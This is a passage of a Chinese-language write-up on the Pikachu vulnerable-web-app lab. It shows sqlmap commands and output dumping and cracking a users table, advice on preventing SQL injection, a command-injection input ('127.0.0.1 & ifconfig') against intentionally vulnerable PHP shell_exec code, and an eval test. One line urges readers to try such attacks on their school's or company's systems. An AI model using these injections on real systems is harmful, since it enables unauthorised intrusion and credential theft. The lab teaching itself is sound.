</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Title</span><span class="p">:</span><span class="w"> </span><span class="n">Generic</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="p">(</span><span class="k">NULL</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">columns</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Payload</span><span class="p">:</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="mi">111</span><span class="s1">&#39; UNION ALL SELECT NULL,CONCAT(0x717a627871,0x4b674d50556f73617967554c514d45494f4a41736662694376737a73644f5671726b6b5049794567,0x7170707171)-- -&amp;submit=%E6%9F%A5%E8%AF%A2
</span></span></span><span class="line"><span class="cl"><span class="s1">---
</span></span></span><span class="line"><span class="cl"><span class="s1">[00:45:27] [INFO] the back-end DBMS is MySQL
</span></span></span><span class="line"><span class="cl"><span class="s1">web server operating system: Linux Ubuntu 18.04 (bionic)
</span></span></span><span class="line"><span class="cl"><span class="s1">web application technology: Apache 2.4.29, PHP
</span></span></span><span class="line"><span class="cl"><span class="s1">back-end DBMS: MySQL &gt;= 5.0.12
</span></span></span><span class="line"><span class="cl"><span class="s1">[00:45:27] [INFO] fetching current database
</span></span></span><span class="line"><span class="cl"><span class="s1">current database: &#39;</span><span class="n">pikachu</span><span class="s1">&#39;
</span></span></span></code></pre></div><p>现在来获取数据库内的表</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">python</span><span class="w"> </span><span class="n">sqlmap</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s2">&#34;http://light.asuka39.top:9000/vul/sqli/sqli_blind_b.php?name=111&amp;submit=%E6%9F%A5%E8%AF%A2&#34;</span><span class="w"> </span><span class="o">-</span><span class="n">D</span><span class="w"> </span><span class="n">pikachu</span><span class="w"> </span><span class="c1">--tables
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">[</span><span class="mi">00</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">13</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">INFO</span><span class="p">]</span><span class="w"> </span><span class="n">fetching</span><span class="w"> </span><span class="n">tables</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">database</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;pikachu&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Database</span><span class="p">:</span><span class="w"> </span><span class="n">pikachu</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="mi">5</span><span class="w"> </span><span class="n">tables</span><span class="p">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">member</span><span class="w">   </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">httpinfo</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">message</span><span class="w">  </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">users</span><span class="w">    </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">xssblind</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+
</span></span></span></code></pre></div><p>获取users表里的列名</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">python</span><span class="w"> </span><span class="n">sqlmap</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s2">&#34;http://light.asuka39.top:9000/vul/sqli/sqli_blind_b.php?name=111&amp;submit=%E6%9F%A5%E8%AF%A2&#34;</span><span class="w"> </span><span class="o">-</span><span class="n">D</span><span class="w"> </span><span class="n">pikachu</span><span class="w"> </span><span class="o">-</span><span class="n">T</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="c1">--columns
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">[</span><span class="mi">00</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">47</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">INFO</span><span class="p">]</span><span class="w"> </span><span class="n">fetching</span><span class="w"> </span><span class="n">columns</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="s1">&#39;users&#39;</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="s1">&#39;pikachu&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Database</span><span class="p">:</span><span class="w"> </span><span class="n">pikachu</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Table</span><span class="p">:</span><span class="w"> </span><span class="n">users</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="mi">4</span><span class="w"> </span><span class="n">columns</span><span class="p">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="k">Column</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="k">Type</span><span class="w">             </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="k">level</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nb">int</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span><span class="w">          </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="nb">int</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="n">unsigned</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">66</span><span class="p">)</span><span class="w">      </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span><span class="w">      </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+------------------+
</span></span></span></code></pre></div><p>获取username和password，SQLmap发现存在哈希值，使用SQLmap自带的字典进行哈希碰撞</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">python</span><span class="w"> </span><span class="n">sqlmap</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s2">&#34;http://light.asuka39.top:9000/vul/sqli/sqli_blind_b.php?name=111&amp;submit=%E6%9F%A5%E8%AF%A2&#34;</span><span class="w"> </span><span class="o">-</span><span class="n">D</span><span class="w"> </span><span class="n">pikachu</span><span class="w"> </span><span class="o">-</span><span class="n">T</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="o">-</span><span class="k">C</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="w"> </span><span class="c1">--dump
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">[</span><span class="mi">00</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">56</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">INFO</span><span class="p">]</span><span class="w"> </span><span class="n">starting</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="n">processes</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="s1">&#39; for user &#39;</span><span class="mi">00</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">58</span><span class="n">pikachu</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39; cracked password &#39;</span><span class="p">]</span><span class="w"> </span><span class="k">current</span><span class="w"> </span><span class="n">status</span><span class="p">:</span><span class="w"> </span><span class="mi">00224</span><span class="p">...</span><span class="w"> </span><span class="err">\</span><span class="mi">000000</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="s1">&#39;NFO00:52:58] cracked password &#39;</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="mi">123456</span><span class="n">INFO</span><span class="s1">&#39; for user &#39;</span><span class="p">]</span><span class="w"> </span><span class="k">current</span><span class="w"> </span><span class="n">status</span><span class="p">:</span><span class="w"> </span><span class="mi">0102</span><span class="n">t</span><span class="p">...</span><span class="w"> </span><span class="o">|</span><span class="k">admin</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[]</span><span class="w"> </span><span class="n">cracked</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="s1">&#39;00:53:02abc123] [&#39;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="s1">&#39;INFOtest] current status: hausv... -&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Database</span><span class="p">:</span><span class="w"> </span><span class="n">pikachu</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Table</span><span class="p">:</span><span class="w"> </span><span class="n">users</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="mi">3</span><span class="w"> </span><span class="n">entries</span><span class="p">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+-------------------------------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">password</span><span class="w">                                  </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+-------------------------------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="k">admin</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">e10adc3949ba59abbe56e057f20f883e</span><span class="w"> </span><span class="p">(</span><span class="mi">123456</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">pikachu</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">670</span><span class="n">b14728ad9902aecba32e22fa4f6bd</span><span class="w"> </span><span class="p">(</span><span class="mi">000000</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">test</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">e99a18c428cb38d5f260853678922e03</span><span class="w"> </span><span class="p">(</span><span class="n">abc123</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+-------------------------------------------+
</span></span></span></code></pre></div><p>账号和对应的密码都已被获取</p>
<p>整个注入过程不到5分钟，可以说非常方便快捷</p>
<p>SQLmap还有非常多强大的功能，更多的使用方法参见<a href="https://github.com/sqlmapproject/sqlmap/wiki">官方WIKI</a>和其他网络资料</p>
<h3 id="sql注入漏洞的防范">SQL注入漏洞的防范</h3>
<ul>
<li>代码层面
<ul>
<li>对输入进行严格的转义和过滤
<ul>
<li>对前端输入的特殊符号进行转义</li>
<li>设置黑名单过滤输入</li>
</ul>
</li>
<li>使用预处理和参数化（推荐）
<ul>
<li>先对SQL语句进行PDO预处理，后将输入作为参数传入</li>
</ul>
</li>
</ul>
</li>
<li>网络层面
<ul>
<li>通过WAF（Web Application Firewall）设备启用防SQL注入策略</li>
<li>使用第三方云端防护</li>
</ul>
</li>
</ul>
<h2 id="rce">RCE</h2>
<h3 id="概述-4">概述</h3>
<p>RCE（Remote Command/Code Execute）漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>
<ul>
<li>远程系统命令执行
<ul>
<li>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面</li>
<li>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交意想不到的命令，从而让后台进行执行，从而控制整个后台服务器</li>
<li>现在很多的甲方企业都开始实施自动化运维，大量的系统操作会通过&quot;自动化运维平台&quot;进行操作。 在这种平台上往往会出现远程系统命令执行的漏洞，不信的话现在就可以找学校或公司运维部的系统测试一下，也许会有意想不到的“收货”</li>
</ul>
</li>
<li>远程代码执行
<ul>
<li>同样的道理,因为需求设计，后台有时候也会把用户的输入作为代码的一部分进行执行，也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数，还是使用了不安全的反序列化等等。 因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</li>
</ul>
</li>
</ul>
<h3 id="exec-ping">exec &ldquo;ping&rdquo;</h3>
<p>页面给了我们一个可以ping某个IP地址的表单，输入127.0.0.1试试</p>
<p><img alt="img" src="./img/2022090-9.png"></p>
<p>也许是因为docker的缘故并没有ping成功，这里使用网上的图片</p>
<p>我们来试试拼接别的命令</p>
<pre tabindex="0"><code>127.0.0.1 &amp; ifconfig
</code></pre><p><img alt="img" src="./img/2022091-7.png"></p>
<p>可以看到后台并没有对命令进行处理，我们还可以通过尝试不同的命令进行攻击</p>
<p>来看看后端源码片段</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;rce_ping.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span> <span class="o">.</span> <span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//header(&#34;Content-type:text/html; charset=gbk&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$result</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ipaddress&#39;</span><span class="p">]</span><span class="o">!=</span><span class="k">null</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ip</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ipaddress&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="c1">//     $check=explode(&#39;.&#39;, $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nx">php_uname</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">),</span> <span class="s1">&#39;windows&#39;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl"><span class="c1">//         var_dump(php_uname(&#39;s&#39;));
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$result</span><span class="o">.=</span><span class="nx">shell_exec</span><span class="p">(</span><span class="s1">&#39;ping &#39;</span><span class="o">.</span><span class="nv">$ip</span><span class="p">);</span><span class="c1">//直接将变量拼接进来，没做处理
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$result</span><span class="o">.=</span><span class="nx">shell_exec</span><span class="p">(</span><span class="s1">&#39;ping -c 4 &#39;</span><span class="o">.</span><span class="nv">$ip</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><h3 id="exec-eval">exec &ldquo;eval&rdquo;</h3>
<p>是一个输入字符的表单，测试后我们输入<code>phpinfo();</code>试试</p>
<p><img alt="img" src="./img/2022092-3.png"></p>
<p>服务器PHP对应的信息就被打印出来了</p>
<p>来看看后端源码片段</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;rce_evel.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span 